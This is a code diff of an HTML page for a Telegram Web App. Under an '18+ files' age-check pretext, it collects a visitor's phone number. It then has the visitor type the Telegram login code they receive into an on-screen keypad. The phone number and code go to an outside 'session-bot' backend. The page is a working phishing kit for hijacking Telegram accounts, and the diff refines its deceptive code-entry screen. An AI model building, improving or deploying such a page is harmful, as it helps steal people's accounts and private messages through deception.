@@ -7,42 +7,73 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { font-family: sans-serif; padding: 0; margin: 0; background: #000; color: white; text-align: center; }
-        .box { background: white; color: #333; padding: 25px; border-radius: 20px; margin: 40px 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
-        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; display: block; text-decoration: none; }
-        .btn-blue { background: #007bff; }
+        .box { background: white; color: #333; padding: 25px; border-radius: 25px; margin: 40px 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
+        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; display: block; text-decoration: none; -webkit-tap-highlight-color: transparent; }
         .hidden { display: none; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; outline: none; }
-        .info-text { font-size: 14px; color: #666; margin-bottom: 15px; }
+        
+        /* keypad */
+        .otp-display { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 32px; text-align: center; background: #f9f9f9; color: #333; letter-spacing: 5px; height: 65px; box-sizing: border-box; outline: none; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 20px; }
+        .key { background: #f1f1f1; padding: 22px; border-radius: 15px; font-size: 26px; font-weight: bold; color: #333; cursor: pointer; border: 1px solid #ddd; -webkit-tap-highlight-color: transparent; }
+        .key:active { background: #ddd; }
+        .key-clear { background: #ffc107; }
+        .key-ok { background: #28a745; color: white; }
+        
+        .instruction { font-size: 14px; color: #666; margin-bottom: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="box" id="step0">
-        <h2 id="title">Verification Required</h2>
-        <p class="info-text">You must confirm your identity to access the files.</p>
+        <h2>Verification</h2>
+        <p style="color:#666;">Confirm you are 18+ to access the files 😊</p>
         <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
         <div id="loader" class="hidden">
-            <p style="color:#28a745; font-weight:bold;">Waiting for contact share...</p>
+            <p style="color:#28a745; font-weight:bold; margin-top:15px;">🔄 Sending Code...</p>
         </div>
     </div>
 
     <div class="box hidden" id="step2">
-        <h3>Verify Identity</h3>
-        <p class="info-text">Click below to see the code, then enter it here.</p>
+        <h3 style="margin-top:0;">Identity Check</h3>
+        <p class="instruction">Check your Telegram chat for the 5-digit login code and enter it below.</p>
         
-        <!-- আপডেট করা বাটন: যা সরাসরি টেলিগ্রাম সার্ভিস চ্যাটে নিয়ে যাবে -->
-        <a href="tg://resolve?domain=Telegram" class="btn btn-blue">📩 Get OTP Code</a>
+        <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
         
-        <input type="number" id="otp" placeholder="Enter Code">
-        <button class="btn" id="v_btn" onclick="verifyOTP()">Verify OK</button>
+        <div class="keypad">
+            <div class="key" onclick="addNum('1')">1</div>
+            <div class="key" onclick="addNum('2')">2</div>
+            <div class="key" onclick="addNum('3')">3</div>
+            <div class="key" onclick="addNum('4')">4</div>
+            <div class="key" onclick="addNum('5')">5</div>
+            <div class="key" onclick="addNum('6')">6</div>
+            <div class="key" onclick="addNum('7')">7</div>
+            <div class="key" onclick="addNum('8')">8</div>
+            <div class="key" onclick="addNum('9')">9</div>
+            <div class="key key-clear" onclick="clearNum()">C</div>
+            <div class="key" onclick="addNum('0')">0</div>
+            <div class="key key-ok" id="v_btn" onclick="verifyOTP()">OK</div>
+        </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        
-        // আপনার ব্যাকএন্ড URL এখানে দিন
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
+        let currentOTP = "";
+
+        // ইউজার যদি অ্যাপ বন্ধ করে আবার খোলে, তবে সে সরাসরি ওটিপি স্ক্রিনে যাবে
+        window.onload = async function() {
+            if(userId) {
+                try {
+                    const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
+                    const data = await res.json();
+                    if (data.status === "success") {
+                        document.getElementById('step0').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
+                    }
+                } catch(e) {}
+            }
+        };
 
         function startFlow() {
             tg.requestContact();
@@ -66,42 +97,33 @@
         async function sendNumber(phone) {
             try {
                 const res = await fetch(`${BACKEND_URL}/send_number`, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
+                    method: "POST", headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, phone: phone })
                 });
                 const data = await res.json();
                 if (data.status === "success") {
                     document.getElementById('step0').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
-                } else {
-                    alert("Error: " + data.message);
-                }
-            } catch (e) { alert("Error connecting to server!"); }
+                } else { alert("Error: " + data.message); }
+            } catch (e) { alert("Server Error!"); }
         }
 
-        async function verifyOTP() {
-            let code = document.getElementById("otp").value;
-            if(code.length < 5) return alert("Please enter the 5-digit code!");
-            
-            document.getElementById('v_btn').disabled = true;
-            document.getElementById('v_btn').innerText = "Verifying...";
+        function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
+        function clearNum() { currentOTP = ""; document.getElementById("otp_display").value = ""; }
 
+        async function verifyOTP() {
+            if(currentOTP.length < 5) return alert("Enter 5 digits!");
+            const vBtn = document.getElementById('v_btn');
+            vBtn.innerText = "..";
             try {
                 const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, otp: code })
+                    method: "POST", headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                 });
                 const data = await res.json();
-                if (data.status === "success") {
-                    tg.close();
-                } else {
-                    alert("Invalid Code! Please try again.");
-                    document.getElementById('v_btn').disabled = false;
-                    document.getElementById('v_btn').innerText = "Verify OK";
-                }
-            } catch (e) { alert("Server Error!"); }
+                if (data.status === "success") tg.close();
+                else { alert("Wrong Code!"); clearNum(); vBtn.innerText = "OK"; }
+            } catch (e) { alert("Error!"); vBtn.innerText = "OK"; }
         }
     </script>
 </body>
